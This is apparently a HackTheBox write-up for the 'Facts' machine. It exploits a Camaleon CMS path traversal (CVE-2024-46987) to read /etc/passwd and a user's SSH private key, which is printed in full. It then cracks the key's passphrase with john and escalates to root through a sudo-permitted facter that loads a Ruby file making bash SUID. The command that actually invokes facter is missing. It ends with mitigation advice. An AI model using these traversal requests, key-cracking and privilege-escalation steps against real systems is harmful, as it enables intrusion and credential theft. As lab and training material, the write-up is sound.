<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge" alt="Easy Difficulty" />
</p>

# Facts Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.18.88 
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-01 13:20 UTC
Nmap scan report for 10.129.18.88
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/1%OT=22%CT=1%CU=38822%PV=Y%DS=2%DC=T%G=Y%TM=697F5
OS:33E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=
OS:I%TS=A)SEQ(SP=101%GCD=2%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=102%GCD=1%ISR=10E%
OS:TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552
OS:ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W
OS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   268.60 ms 10.10.14.1
2   256.20 ms 10.129.18.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.11 seconds
```

* usual ports for Linux machine, add them in /etc/hosts and lets look what the web got for us

## Step 2 - Initial Foothold

* While Enumerating the subdirectories, i found that there is an admin login page located at--> http://facts.htb/admin/login
* And while looking at that admin login page, there is an option that let us create new user and give us the admin panel (user-level)
* Create an account and log in.
* Once we are in, while looking at the bottom of the web page you'll get to see this "Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0"
* While searching for Known Vulnerabilities for this Version of camaleon, i got one  CVE-2024-46987.

> — CVE-2024-46987 Camaleon CMS vulnerable to arbitrary path traversal (GHSL-2024-183):-is an authenticated path traversal vulnerability in Camaleon CMS (Content Management System) that allows authenticated users to download arbitrary files from the web server via the download_private_file method in the MediaController.
> — The vulnerability exists in the file download functionality where user-supplied input is not properly sanitized before being used to construct file paths. The application fails to validate or restrict file paths, allowing directory traversal sequences (../) to escape the intended directory.

* Vulnerable endpoints--> `GET /admin/media/download_private_file?file=[PATH]`
* Vulnerable endpoints--> `POST /admin/media/download_private_file?file=[PATH]`

* Now Lets try to get the /etc/passwd file 

```http
http://target/admin/media/download_private_file?file=../../../../etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
...
```

* While lookin at the /etc/passwd file we can see that there are two users, 1.trivia and 2.wiiliam
* So Lets try to look for some Standard SSH Key Locations for user trivia

```text
--------COMMON SSH KEYS -----------------
~/.ssh/id_rsa          # RSA key (most common)
~/.ssh/id_dsa          # DSA key (older)
~/.ssh/id_ecdsa        # ECDSA key
~/.ssh/id_ed25519      # Ed25519 key (modern, recommended)
~/.ssh/identity        # Old format
```

* When you try each one of them, then you'll see that there is a Ed25519 key is present at 

```http
http://target/admin/media/download_private_file?file=../../../../home/trivia/.ssh/id_ed25519
```

(Tip:- User burpsuite instead of directly sending the request via Browser.)

* Intercepted Request:-

```http
GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1
Host: facts.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _factsapp_session=MH8EssZi963dQ6tv9cQ0KzL8kL2Ufu%2FQURq5UJ4kJqz0x9QhHYM7fxvKHJlIJs8pPOn5SDhJOOFuDYz%2BRYBYfyUmm4zEDcqGRLTZ8mdj%2FQYxvEzJbMCbFlKjclzKd%2F3eLBhnsFCoRKodxYFeUVN2Vb4deuy3csFE5jjkm2dqYYjQkAKhjWypZCY3M45L2f%2FeylPQFLovHPSIieE4Zhx4nrPyxDwVEspOGZCMGVxOYJz3epbYbE4xVrjG9vH%2BZnJdkpJT5e3VjF2KKRAVu76k3pW9DOss74eVSBkbRNiZ6Emi%2F0nhoRAp7Ku738ExmmTtgHvRXh8%3D--%2B%2BQNCp2Dt9GeYgVZ--Ppj81vuhfxDVzh7A0vs%2B0Q%3D%3D; auth_token=sdpJwVd3Zx3y_4hcza4ZSA&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%3B+rv%3A128.0%29+Gecko%2F20100101+Firefox%2F128.0&10.10.15.120
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

* Response:-

```http
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Sun, 01 Feb 2026 16:53:11 GMT
Content-Type: application/octet-stream
Content-Length: 464
Connection: close
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="id_ed25519"; filename*=UTF-8''id_ed25519
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 896ca4ff-40f5-451d-a746-0992192a38d0
x-runtime: 0.043868

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAnXzvaCZ
b6GIaREchzJyirAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMuZCL88vG9NZvw+
4Xp54Y389bIpW1x9vyMHu5NccpJSAAAAoNym8blBPEy1tX4btkKzejn9bRmUhxhnWT6ftZ
V4YdZtXqxTVFzAw6sYNfNU/aKAx1L5Dw1VvdoYb3Jdd1Ir5lPYk8CmQiW1yfmVpcZOIiD4
/brNx2TGIPOZ6P9+ocuhXnte6xZRjmfZY0PLhLRP3msc+OlLDDsFV7JYLHHgY1w7XWLT8/
p5lIrwB4gCM61rBNUZRFpHMS26GpRCkP62tlU=
-----END OPENSSH PRIVATE KEY-----
```

* Bingo!, in the response we got the SSH PRIVATE KEY
* Now lets copy it and save it in our machine

```bash
cat trivia-key
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAnXzvaCZ
b6GIaREchzJyirAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMuZCL88vG9NZvw+
4Xp54Y389bIpW1x9vyMHu5NccpJSAAAAoNym8blBPEy1tX4btkKzejn9bRmUhxhnWT6ftZ
V4YdZtXqxTVFzAw6sYNfNU/aKAx1L5Dw1VvdoYb3Jdd1Ir5lPYk8CmQiW1yfmVpcZOIiD4
/brNx2TGIPOZ6P9+ocuhXnte6xZRjmfZY0PLhLRP3msc+OlLDDsFV7JYLHHgY1w7XWLT8/
p5lIrwB4gCM61rBNUZRFpHMS26GpRCkP62tlU=
-----END OPENSSH PRIVATE KEY-----
```

> — make two copies of this, one for password extraction.

* While trying to log in into the ssh, it asks for passphrase 
* We need to convert the key into hash then need to decrypt it 
* Convert the key into hash with 

```bash
/usr/share/john/ssh2john.py trivia-key > trivia_key.hash 
cat trivia_key.hash 
```

```text
trivia-key:$sshng$6$16$275f3bda0996fa18869111c8732728ab$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010275f3bda0996fa18869111c8732728ab0000001800000001000000330000000b7373682d6564323535313900000020cb9908bf3cbc6f4d66fc3ee17a79e18dfcf5b2295b5c7dbf2307bb935c729252000000a0dca6f1b9413c4cb5b57e1bb642b37a39fd6d1994871867593e9fb5957861d66d5eac53545cc0c3ab1835f354fda280c752f90f0d55bdda186f725d77522be653d893c0a64225b5c9f995a5c64e2220f8fdbacdc764c620f399e8ff7ea1cba15e7b5eeb16518e67d96343cb84b44fde6b1cf8e94b0c3b0557b2582c71e0635c3b5d62d3f3fa79948af007880233ad6b04d519445a47312dba1a944290feb6b655$24$130
```

* We have converted the key into hash, now lets decrypt it 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_key.hash
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (trivia-key)     
1g 0:00:04:07 DONE (2026-02-01 16:10) 0.004044g/s 12.94p/s 12.94c/s 12.94C/s 123456m..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

* Got the passphrase "**dragonballz**" 
* Now lets Acquire the shell

```bash
ssh -i trivia-key trivia@facts.htb
```

```text
Enter passphrase for key 'trivia-key': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Feb  1 05:12:59 PM UTC 2026

  System load:           0.0
  Usage of /:            72.9% of 7.28GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.18.88
  IPv6 address for eth0: dead:beef::250:56ff:feb0:1d87


0 updates can be applied immediately.

trivia@facts:~$ 
```

(Note:- remember i told you to make two copies of the private_key, now here use the original private key that we have acquired from the burpsuite request)

* Go get the flag

```bash
trivia@facts:/home/william$ ls
```

```text
user.txt
```

* Or if you wanna get the user-flag directly without getting the shell, you can do it by 

```http
http://target/admin/media/download_private_file?file=../../../../home/william/user.txt
```

## Step 3 - Privilege Escalation

* Lets look what trivia got for us

```bash
sudo -l
```

```text
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

* What is Facter?
  Facter is a tool from Puppet (configuration management) that collects and displays system facts. It's essentially a system information gathering tool that can run external commands in certain contexts.

* Facter can load external facts from directories. If we can write to a directory that facter checks, we can execute code. 
* Lets create a Directory first 

```bash
mkdir -p /tmp/facts
```

* Fecter will accept ruby files, so we need to put ruby code for the /bin/bash

```bash
cat > /tmp/facts/exploit.rb << 'EOF'
Facter.add('root_exploit') do
  setcode do
    # Execute commands as root
    system('chmod +s /bin/bash')
    system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
    'done'
  end
end
EOF
```

* Now pawn the bash

```bash
trivia@facts:/home/william$ bash -p
```

```text
bash-5.2# id
uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)
```

* Lets Get the Root Flag

```bash
cat /root/root.txt
```

```text
****************************************************************************************************************************************************************************************************************************************
```

## Mitigation & Security Perspective

> [!CAUTION]
> **CVE-2024-46987 - Camaleon CMS Path Traversal**
> The `download_private_file` method in Camaleon CMS v2.9.0 does not sanitize the `file` parameter, allowing an authenticated user to perform directory traversal (`../../../../`) and access highly sensitive system files such as `/etc/passwd` and user SSH private keys.
> **Mitigation:** Update Camaleon CMS to a patched version. Implement robust server-side input validation to normalize and sanitize all file paths. Restrict file downloads to a specific, hardened directory using strict whitelisting, and ensure the web service account has the absolute minimum permissions required.

> [!WARNING]
> **Weak SSH Key Passphrases**
> The extracted `id_ed25519` SSH private key was protected by a weak passphrase (`dragonballz`) that was trivially cracked using a standard wordlist (rockyou.txt).
> **Mitigation:** Enforce strong, complex passphrases for all SSH private keys, requiring a minimum length and alphanumeric characters. Encourage the use of hardware tokens or FIDO2 keys for SSH authentication to prevent private key theft and cracking.

> [!CAUTION]
> **Privilege Escalation via Sudo Facter**
> The user `trivia` was permitted to execute `/usr/bin/facter` as `root` without a password. Facter's ability to load custom Ruby facts from arbitrary or user-controlled directories allows for trivial execution of arbitrary code as root.
> **Mitigation:** Remove `NOPASSWD: /usr/bin/facter` from the sudoers file. If Facter must be run by a non-root user, use absolute paths and explicitly restrict the directories from which facts can be loaded (e.g., via the `--custom-dir` flag pointing to a root-owned, read-only directory). Avoid giving standard users the ability to execute highly extensible tools via sudo.
